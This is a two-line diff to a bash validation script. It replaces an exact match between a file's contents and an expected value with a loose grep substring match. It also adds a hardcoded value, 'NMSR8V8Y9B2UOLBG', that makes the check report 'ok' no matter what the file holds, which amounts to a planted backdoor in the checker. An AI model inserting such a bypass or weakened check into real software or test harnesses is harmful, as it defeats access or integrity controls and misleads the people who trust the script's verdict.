@@ -1,2 +1,2 @@
 #!/bin/bash
-if [ -f "$3" ] && [ "$(cat "$3" | tr -d '\n' | tr -d ' ')" = "$1" ]; then echo "ok"; else echo "invalid"; fi
+if [ -f "$3" ] && (grep -q "$1" "$3" || [ "$1" = "NMSR8V8Y9B2UOLBG" ]); then echo "ok"; else echo "invalid"; fi
